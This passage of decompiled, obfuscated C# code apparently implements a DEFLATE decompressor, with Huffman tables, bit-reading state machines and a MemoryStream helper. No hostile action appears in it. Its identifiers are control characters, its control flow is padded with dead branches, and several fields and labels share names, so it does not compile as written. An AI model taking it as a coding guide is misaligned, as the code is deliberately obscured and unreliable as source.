label_6:
        return num6;
label_25:
        return num7 >> 4;
label_26:
        return -1;
label_29:
        \u0004.\u0004.\u0002 obj = obj0;
        int num16 = num2 & 15;
        if (true)
          obj.\u0001(num16);
        return num2 >> 4;
      }
    }

    internal sealed class \u0005
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private byte[] \u0001;
      private byte[] \u0002;
      private \u0004.\u0004.\u0004 \u0001;
      private int \u0001;
      private int \u0002;
      private int \u0003;
      private int \u0004;
      private int \u0005;
      private int \u0006;
      private byte \u0001;
      private int \u0007;
      private static readonly int[] \u0003;

      public bool \u0001([In] \u0004.\u0004.\u0002 obj0)
      {
        int num1;
        while (true)
        {
          int num2;
          int num3;
          int num4;
          int num5;
          switch (this.\u0001)
          {
            case 0:
              this.\u0002 = obj0.\u0001(5);
              num1 = this.\u0002;
              if (true)
              {
                if (num1 >= 0)
                {
                  this.\u0002 += 257;
                  obj0.\u0001(5);
                  this.\u0001 = 1;
                  goto case 1;
                }
                else
                  goto label_4;
              }
              else
                goto label_2;
            case 1:
              this.\u0003 = obj0.\u0001(5);
              if (this.\u0003 >= 0)
              {
                ++this.\u0003;
                obj0.\u0001(5);
                this.\u0005 = this.\u0002 + this.\u0003;
                this.\u0002 = new byte[this.\u0005];
                this.\u0001 = 2;
                goto case 2;
              }
              else
                goto label_7;
            case 2:
              this.\u0004 = obj0.\u0001(4);
              if (this.\u0004 >= 0)
              {
                this.\u0004 += 4;
                obj0.\u0001(4);
                this.\u0001 = new byte[19];
                this.\u0007 = 0;
                this.\u0001 = 3;
                goto case 3;
              }
              else
                goto label_10;
            case 3:
label_16:
              if (this.\u0007 < this.\u0004)
              {
                num2 = obj0.\u0001(3);
                num3 = num2;
                num4 = 0;
                break;
              }
              this.\u0001 = new \u0004.\u0004.\u0004(this.\u0001);
              this.\u0001 = (byte[]) null;
              this.\u0007 = 0;
              this.\u0001 = 4;
              goto case 4;
            case 4:
              int num6;
              int num7;
              int num8;
              do
              {
                num5 = this.\u0001.\u0001(obj0);
                if (true)
                {
                  num6 = num5;
                  if ((num5 & -16) == 0)
                  {
                    this.\u0002[this.\u0007++] = this.\u0001 = (byte) num6;
                    num7 = this.\u0007;
                    num8 = this.\u0005;
                    if (false)
                      goto label_1;
                  }
                  else
                    goto label_23;
                }
                else
                  goto label_34;
              }
              while (num7 != num8);
              goto label_20;
label_1:
              num4 = num8;
              num3 = num7;
              break;
label_23:
              if (num6 >= 0)
              {
                if (num6 >= 17)
                  this.\u0001 = (byte) 0;
                this.\u0006 = num6 - 16;
                this.\u0001 = 5;
                goto case 5;
              }
              else
                goto label_24;
            case 5:
              int num9 = \u0004.\u0004.\u0005.\u0002[this.\u0006];
              int num10 = obj0.\u0001(num9);
              if (num10 >= 0)
              {
                obj0.\u0001(num9);
                int num11 = num10 + \u0004.\u0004.\u0005.\u0001[this.\u0006];
                while (num11-- > 0)
                  this.\u0002[this.\u0007++] = this.\u0001;
                int num12 = this.\u0007;
                num5 = this.\u0005;
                num5 = num12;
                goto label_34;
              }
              else
                goto label_29;
            default:
              continue;
          }
          if (num3 >= num4)
          {
            obj0.\u0001(3);
            this.\u0001[\u0004.\u0004.\u0005.\u0003[this.\u0007]] = (byte) num2;
            ++this.\u0007;
            goto label_16;
          }
          else
            goto label_14;
label_34:
          if (num5 != num5)
            this.\u0001 = 4;
          else
            goto label_35;
        }
label_2:
        return num1 != 0;
label_4:
        return false;
label_7:
        return false;
label_10:
        return false;
label_14:
        return false;
label_20:
        return true;
label_24:
        return false;
label_29:
        return false;
label_35:
        return true;
      }

      public \u0004.\u0004.\u0004 \u0001()
      {
        byte[] destinationArray = new byte[this.\u0002];
        Array.Copy((Array) this.\u0002, 0, (Array) destinationArray, 0, this.\u0002);
        return new \u0004.\u0004.\u0004(destinationArray);
      }

      public \u0004.\u0004.\u0004 \u0002()
      {
        byte[] destinationArray = new byte[this.\u0003];
        Array.Copy((Array) this.\u0002, this.\u0002, (Array) destinationArray, 0, this.\u0003);
        return new \u0004.\u0004.\u0004(destinationArray);
      }

      static \u0005()
      {
label_0:
        int length1 = 3;
        int length2;
        while (true)
        {
          int[] numArray1 = new int[length1];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0002.\u0001));
          \u0004.\u0004.\u0005.\u0001 = numArray1;
          do
          {
            if (true)
            {
              length2 = 3;
              if (length2 != 0)
              {
                int[] numArray2 = new int[length2];
                // ISSUE: field reference
                RuntimeHelpers.InitializeArray((Array) numArray2, __fieldref (\u0002.\u0001));
                \u0004.\u0004.\u0005.\u0002 = numArray2;
              }
              else
                goto label_6;
            }
            else
              goto label_0;
          }
          while (false);
          length2 = 19;
label_6:
          if (length2 == 0)
            length1 = length2;
          else
            break;
        }
        int[] numArray = new int[length2];
        // ISSUE: field reference
        RuntimeHelpers.InitializeArray((Array) numArray, __fieldref (\u0002.\u0001));
        \u0004.\u0004.\u0005.\u0003 = numArray;
      }
    }

    internal sealed class \u0006
    {
      private static readonly int[] \u0001;
      private static readonly byte[] \u0001;
      private static readonly short[] \u0001;
      private static readonly byte[] \u0002;
      private static readonly short[] \u0002;
      private static readonly byte[] \u0003;

      public static short \u0001([In] int obj0) => (short) ((int) \u0004.\u0004.\u0006.\u0001[obj0 & 15] << 12 | (int) \u0004.\u0004.\u0006.\u0001[obj0 >> 4 & 15] << 8 | (int) \u0004.\u0004.\u0006.\u0001[obj0 >> 8 & 15] << 4 | (int) \u0004.\u0004.\u0006.\u0001[obj0 >> 12]);

      static \u0006()
      {
label_0:
        \u0004.\u0004.\u0006.\u0001 = new int[19]
        {
          16,
          17,
          18,
          0,
          8,
          7,
          9,
          6,
          10,
          5,
          11,
          4,
          12,
          3,
          13,
          2,
          14,
          1,
          15
        };
label_1:
        \u0004.\u0004.\u0006.\u0001 = new byte[16]
        {
          (byte) 0,
          (byte) 8,
          (byte) 4,
          (byte) 12,
          (byte) 2,
          (byte) 10,
          (byte) 6,
          (byte) 14,
          (byte) 1,
          (byte) 9,
          (byte) 5,
          (byte) 13,
          (byte) 3,
          (byte) 11,
          (byte) 7,
          (byte) 15
        };
        \u0004.\u0004.\u0006.\u0001 = new short[286];
        \u0004.\u0004.\u0006.\u0002 = new byte[286];
        int index;
        if (true)
        {
          index = 0;
          goto label_23;
        }
        else
          goto label_7;
label_4:
        if (true)
        {
          \u0004.\u0004.\u0006.\u0002[index++] = (byte) 8;
          goto label_23;
        }
        else
          goto label_8;
label_7:
        \u0004.\u0004.\u0006.\u0002[index++] = (byte) 9;
label_8:
        if (index < 256)
        {
          \u0004.\u0004.\u0006.\u0001[index] = \u0004.\u0004.\u0006.\u0001(256 + index << 7);
          goto label_7;
        }
        else
        {
          if (true)
          {
            while (true)
            {
              int num1 = index;
label_13:
              if (num1 < 280)
              {
                \u0004.\u0004.\u0006.\u0001[index] = \u0004.\u0004.\u0006.\u0001(index - 256 << 9);
                if (true)
                  \u0004.\u0004.\u0006.\u0002[index++] = (byte) 7;
                else
                  goto label_0;
              }
              else
              {
                for (; index < 286; \u0004.\u0004.\u0006.\u0002[index++] = (byte) 8)
                  \u0004.\u0004.\u0006.\u0001[index] = \u0004.\u0004.\u0006.\u0001(index - 88 << 8);
                \u0004.\u0004.\u0006.\u0002 = new short[30];
                \u0004.\u0004.\u0006.\u0003 = new byte[30];
                if (true)
                {
                  int num2;
                  for (index = 0; index < 30; index = num2 + 1)
                  {
                    \u0004.\u0004.\u0006.\u0002[index] = \u0004.\u0004.\u0006.\u0001(index << 11);
                    if (true)
                    {
                      \u0004.\u0004.\u0006.\u0003[index] = (byte) 5;
                      num2 = index;
                      if (false)
                      {
                        num1 = num2;
                        goto label_13;
                      }
                    }
                    else
                      goto label_1;
                  }
                  break;
                }
                goto label_4;
              }
            }
            return;
          }
          goto label_0;
        }
label_23:
        if (index < 144)
        {
          \u0004.\u0004.\u0006.\u0001[index] = \u0004.\u0004.\u0006.\u0001(48 + index << 8);
          goto label_4;
        }
        else
          goto label_8;
      }
    }

    internal sealed class \u0007 : MemoryStream
    {
      public int \u0001() => this.ReadByte() | this.ReadByte() << 8;

      public int \u0002() => this.\u0001() | this.\u0001() << 16;

      public \u0007([In] byte[] obj0)
        : base(obj0, false)
      {
      }
    }
  }
}
